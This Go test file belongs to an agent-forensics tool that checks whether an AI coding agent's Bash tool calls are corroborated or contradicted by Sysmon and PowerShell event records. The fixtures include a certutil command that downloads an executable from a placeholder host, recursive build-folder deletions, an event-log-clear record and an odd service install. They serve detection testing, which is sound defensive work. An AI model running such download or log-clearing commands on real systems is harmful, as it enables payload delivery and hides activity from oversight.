package correlate

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/efij/AgentDFIR/v4/internal/endpoint"
	w "github.com/efij/AgentDFIR/v4/internal/endpoint/evtx/evtxtest"
	"github.com/efij/AgentDFIR/v4/internal/schema"
)

func writeFile(t *testing.T, name string, b []byte) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(p, b, 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func sysmonCreate(id uint64, at time.Time, pid, ppid uint32, image, cmd, parent string) w.Event {
	return w.Event{Provider: "Microsoft-Windows-Sysmon", EventID: 1, Qualifiers: -1, Version: 5, Level: 4, Time: at, RecordID: id, PID: 3056, TID: 4012,
		Channel: "Microsoft-Windows-Sysmon/Operational", Computer: "DESK-01", UserSID: "S-1-5-18",
		Data: []w.KV{{Name: "UtcTime", Value: w.String(at.Format("2006-01-02 15:04:05.000"))}, {Name: "ProcessId", Value: w.Uint32(pid)},
			{Name: "Image", Value: w.String(image)}, {Name: "CommandLine", Value: w.String(cmd)}, {Name: "User", Value: w.String(`DESK\dev`)},
			{Name: "ParentProcessId", Value: w.Uint32(ppid)}, {Name: "ParentImage", Value: w.String(parent)}}}
}

// An agent Bash tool call is CORROBORATED by a Sysmon EID 1 record read
// from a native .evtx file exactly as it is from the XML export, and a
// command with no matching process is CONTRADICTED the same way.
func TestEVTXCorroboratesLikeSysmonXML(t *testing.T) {
	const cursor = `C:\Users\dev\AppData\Local\Programs\cursor\Cursor.exe`
	xmlDoc := `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>1</EventID><TimeCreated SystemTime="2026-08-30T10:00:07.0000000Z"/><EventRecordID>77</EventRecordID></System>
<EventData><Data Name="UtcTime">2026-08-30 10:00:07.000</Data><Data Name="ProcessId">4411</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c rmdir /s /q build</Data><Data Name="User">DESK\dev</Data><Data Name="ParentProcessId">4400</Data><Data Name="ParentImage">` + cursor + `</Data></EventData></Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>1</EventID><TimeCreated SystemTime="2026-08-30T10:00:40.0000000Z"/><EventRecordID>78</EventRecordID></System>
<EventData><Data Name="UtcTime">2026-08-30 10:00:40.000</Data><Data Name="ProcessId">4412</Data><Data Name="Image">C:\Windows\System32\certutil.exe</Data><Data Name="CommandLine">certutil -urlcache -f http://x/a.exe a.exe</Data><Data Name="User">DESK\dev</Data><Data Name="ParentProcessId">4400</Data><Data Name="ParentImage">` + cursor + `</Data></EventData></Event>
`
	img := w.Build(w.Events([]w.Event{
		sysmonCreate(77, ts("2026-08-30T10:00:07Z"), 4411, 4400, `C:\Windows\System32\cmd.exe`, "cmd.exe /c rmdir /s /q build", cursor),
		sysmonCreate(78, ts("2026-08-30T10:00:40Z"), 4412, 4400, `C:\Windows\System32\certutil.exe`, "certutil -urlcache -f http://x/a.exe a.exe", cursor),
	}), w.Options{})

	run := func(path string) ([]schema.Event, *EndpointResult, []schema.Finding) {
		lr, err := endpoint.Load(path, endpoint.FormatAuto)
		if err != nil {
			t.Fatal(err)
		}
		events := []schema.Event{
			tc("e1", "2026-08-30T10:00:07Z", "Bash", "rmdir /s /q build"),
			tc("e2", "2026-08-30T10:00:20Z", "Bash", "pytest -q"),
		}
		res, f := Endpoint(events, lr.Records, EndpointOptions{})
		return events, res, f
	}
	xe, xr, xf := run(writeFile(t, "sysmon.xml", []byte(xmlDoc)))
	ee, er, ef := run(writeFile(t, "Sysmon.evtx", img))

	if ee[0].Corroboration != schema.StateCorroborated || ee[1].Corroboration != schema.StateContradicted {
		t.Fatalf("evtx states: %s %s", ee[0].Corroboration, ee[1].Corroboration)
	}
	if !strings.Contains(ee[0].Summary, "corroborated by sysmon process (sysmon:1 (record 77))") {
		t.Fatalf("evidence note: %q", ee[0].Summary)
	}
	if !reflect.DeepEqual(xe, ee) || !reflect.DeepEqual(stripProvenance(xr), stripProvenance(er)) || !reflect.DeepEqual(xf, ef) {
		t.Fatalf("xml and evtx disagree:\nxml  %+v\n%+v\n%+v\nevtx %+v\n%+v\n%+v", xe, xr, xf, ee, er, ef)
	}
}

// PowerShell 4104 script blocks corroborate a command but never
// contradict one and never widen process coverage.
func TestScriptBlocksCorroborateOnly(t *testing.T) {
	events := []schema.Event{
		tc("e1", "2026-08-30T10:00:07Z", "Bash", "powershell -c Remove-Item -Recurse -Force build"),
		tc("e2", "2026-08-30T10:00:30Z", "Bash", "git status"),
	}
	recs := []endpoint.Record{
		{Time: ts("2026-08-30T10:00:08Z"), Kind: "script", PID: 6000, Exe: "powershell.exe", Cmdline: "Remove-Item -Recurse -Force build", Source: "powershell", Ref: "powershell:4104 (record 900)"},
		{Time: ts("2026-08-30T09:00:00Z"), Kind: "script", Exe: "powershell.exe", Cmdline: "Get-Date", Source: "powershell", Ref: "powershell:4104 (record 1)"},
		{Time: ts("2026-08-30T11:00:00Z"), Kind: "script", Exe: "powershell.exe", Cmdline: "Get-Date", Source: "powershell", Ref: "powershell:4104 (record 2)"},
		{Time: ts("2026-08-30T10:00:31Z"), Kind: "log-clear", Source: "eventlog", Ref: "eventlog:1102 (record 3)"},
		{Time: ts("2026-08-30T10:00:32Z"), Kind: "service", Exe: `C:\x.exe`, Cmdline: `C:\x.exe`, Source: "system", Ref: "system:7045 (record 4)"},
	}
	res, f := Endpoint(events, recs, EndpointOptions{})
	if events[0].Corroboration != schema.StateCorroborated || !strings.Contains(events[0].Summary, "powershell:4104 (record 900)") {
		t.Fatalf("script block should corroborate: %+v", events[0])
	}
	if events[1].Corroboration != schema.StateObserved || len(f) != 0 || res.Contradicted != 0 || res.ScriptCorroborated != 1 || !res.CoverageStart.IsZero() {
		t.Fatalf("script/service/log-clear records must not contradict or create coverage: %+v %+v %+v", events[1], res, f)
	}
}

// stripProvenance clears what only says where records came from and how
// complete their source is (file, record-id domain, computer name and the
// coverage/health built from them), so two input formats of the same
// events can be compared on the correlation itself.
func stripProvenance(r *EndpointResult) *EndpointResult {
	cp := *r
	cp.KindCoverage, cp.Health, cp.Decisions = nil, nil, nil
	strip := func(rec *endpoint.Record) { rec.Seq, rec.SeqDomain, rec.Host, rec.Origin = 0, "", "", "" }
	cp.Matches = append([]Match(nil), r.Matches...)
	for i := range cp.Matches {
		strip(&cp.Matches[i].Record)
		cp.Matches[i].Related = append([]RelatedRecord(nil), cp.Matches[i].Related...)
		for j := range cp.Matches[i].Related {
			strip(&cp.Matches[i].Related[j].Record)
		}
	}
	return &cp
}

func stripRecords(rs []endpoint.Record) []endpoint.Record {
	out := append([]endpoint.Record(nil), rs...)
	for i := range out {
		out[i].Seq, out[i].SeqDomain, out[i].Host, out[i].Origin = 0, "", "", ""
	}
	return out
}
